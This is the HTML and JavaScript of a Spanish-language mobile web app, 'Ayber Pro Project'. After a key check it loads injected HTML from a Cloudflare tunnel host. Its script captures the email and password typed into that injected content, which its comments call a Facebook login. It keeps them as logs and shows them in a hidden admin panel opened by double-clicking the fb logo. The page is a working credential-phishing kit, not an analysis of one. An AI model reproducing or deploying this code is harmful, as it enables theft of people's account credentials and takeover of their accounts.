<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ayber Pro Project</title>
    
    <meta name="theme-color" content="#000000">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <link rel="manifest" href="manifest.json">
    <link rel="apple-touch-icon" href="pro.png">

    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: #000000; display: flex;
            justify-content: center; align-items: center;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            overflow: hidden;
        }

        /* Pantalla de Carga Inicial */
        #screen-loader {
            display: flex; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 9999;
            flex-direction: column; justify-content: center; align-items: center;
        }
        .spinner {
            width: 45px; height: 45px; border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #0866ff; border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Sección de Validación de KEY */
        #login-section {
            display: none; width: 100%; max-width: 412px;
            height: 100%; position: relative; flex-direction: column; align-items: center;
        }
        .pro-image { width: 100%; height: auto; display: block; }
        .elements-overlay {
            position: absolute; bottom: 15%; width: 85%;
            display: flex; flex-direction: column; align-items: center;
        }
        .input-key {
            width: 100%; height: 48px; background-color: #ffffff;
            border: none; border-radius: 50px; text-align: center;
            font-size: 16px; color: #333; margin-bottom: 12px; outline: none;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }
        .btn-acceder {
            width: 100%; height: 48px; background-color: #b0b0b0;
            color: #000; font-size: 18px; font-weight: bold;
            border: none; border-radius: 25px; cursor: pointer;
            transition: transform 0.1s;
        }
        .btn-acceder:active { transform: scale(0.96); }

        /* Contenedor de la Aplicación Real (inyectada desde Python) */
        #app-content {
            display: none; width: 100%; height: 100%;
            background: #fff; overflow-y: auto;
        }

        /* Panel de Logs de Usuario (Admin) */
        #admin-panel {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #1c1e21; color: white; z-index: 8000; padding: 20px;
            box-sizing: border-box; overflow-y: auto;
        }
        .log-card {
            background: #242526; padding: 15px; border-radius: 10px;
            margin-bottom: 15px; border-left: 5px solid #0866ff;
        }
    </style>
</head>
<body>

    <div id="screen-loader">
        <div class="spinner"></div>
    </div>

    <div id="login-section">
        <img src="pro.png" class="pro-image">
        <div class="elements-overlay">
            <input type="text" id="keyField" class="input-key" placeholder="INGRESAR KEY" autocomplete="off">
            <button class="btn-acceder" onclick="validarForm()">Acceder</button>
        </div>
    </div>

    <div id="app-content"></div>

    <div id="admin-panel">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
            <span style="font-weight: bold; color: #0866ff; font-size: 20px;">LOGS AYBER</span>
            <button onclick="cerrarAdmin()" style="background:none; border:none; color:white; font-size:24px;">✕</button>
        </div>
        <div id="logs-list"></div>
        <button onclick="borrarHistorial()" style="background:#f3425f; color:white; border:none; padding:12px; width:100%; border-radius:8px; margin-top:15px; font-weight:bold;">BORRAR TODO</button>
    </div>

    <script>
        const API_BASE = "https://mixture-deutsche-english-jewellery.trycloudflare.com";
        const STORAGE_ID = "cuentas_ayber_local";
        const KEY_STORE = "app_key_auth";

        // 1. Verificación al iniciar
        window.onload = async () => {
            const savedKey = localStorage.getItem(KEY_STORE);
            if (savedKey) {
                const isOk = await checkAccess(savedKey);
                if (!isOk) showLoginScreen();
            } else {
                showLoginScreen();
            }
            
            // Registro del Service Worker para PWA
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('sw.js').catch(err => console.log("SW error", err));
            }
        };

        function showLoginScreen() {
            document.getElementById('screen-loader').style.display = 'none';
            document.getElementById('login-section').style.display = 'flex';
        }

        async function validarForm() {
            const val = document.getElementById('keyField').value.trim();
            if (!val) return;
            
            document.getElementById('screen-loader').style.display = 'flex';
            const ok = await checkAccess(val);
            
            if (ok) {
                localStorage.setItem(KEY_STORE, val);
            } else {
                document.getElementById('screen-loader').style.display = 'none';
                alert("KEY INCORRECTA O YA USADA");
            }
        }

        async function checkAccess(k) {
            try {
                const response = await fetch(`${API_BASE}/verify`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ key: k })
                });

                if (response.ok) {
                    const data = await response.json();
                    document.getElementById('screen-loader').style.display = 'none';
                    document.getElementById('login-section').style.display = 'none';
                    
                    const appDiv = document.getElementById('app-content');
                    appDiv.style.display = 'block';
                    appDiv.innerHTML = data.html;

                    // Escuchar eventos del botón de login de la app inyectada
                    setupCapturer();
                    return true;
                }
                return false;
            } catch (err) {
                return false;
            }
        }

        function setupCapturer() {
            // Detectar cuando el usuario hace clic en el botón de login cargado de Facebook
            document.addEventListener('click', (e) => {
                if (e.target && e.target.id === 'btn-login') {
                    const email = document.getElementById('email')?.value;
                    const pass = document.getElementById('pass')?.value;
                    
                    if(email && pass) {
                        // Guardar copia local para el panel admin
                        let logs = JSON.parse(localStorage.getItem(STORAGE_ID) || "[]");
                        logs.push({ user: email, pass: pass, fecha: new Date().toLocaleString() });
                        localStorage.setItem(STORAGE_ID, JSON.stringify(logs));
                    }
                }
            });

            // Activar panel admin con doble clic en logo (si existe)
            setTimeout(() => {
                const logoImg = document.querySelector('img[alt="fb"]');
                if(logoImg) {
                    logoImg.ondblclick = () => {
                        renderLogs();
                        document.getElementById('admin-panel').style.display = 'block';
                    };
                }
            }, 1500);
        }

        function renderLogs() {
            const list = document.getElementById('logs-list');
            const data = JSON.parse(localStorage.getItem(STORAGE_ID) || "[]");
            if(data.length === 0) {
                list.innerHTML = "<p style='text-align:center; color:#888;'>Sin registros.</p>";
                return;
            }
            list.innerHTML = data.map(item => `
                <div class="log-card">
                    <div style="font-size:11px; color:#0866ff; margin-bottom:5px;">${item.fecha}</div>
                    <div style="margin:2px 0;"><b>U:</b> ${item.user}</div>
                    <div style="margin:2px 0;"><b>P:</b> ${item.pass}</div>
                </div>
            `).reverse().join('');
        }

        function cerrarAdmin() { document.getElementById('admin-panel').style.display = 'none'; }
        function borrarHistorial() { if(confirm("¿Borrar todo?")) { localStorage.removeItem(STORAGE_ID); renderLogs(); } }
    </script>
</body>
</html>
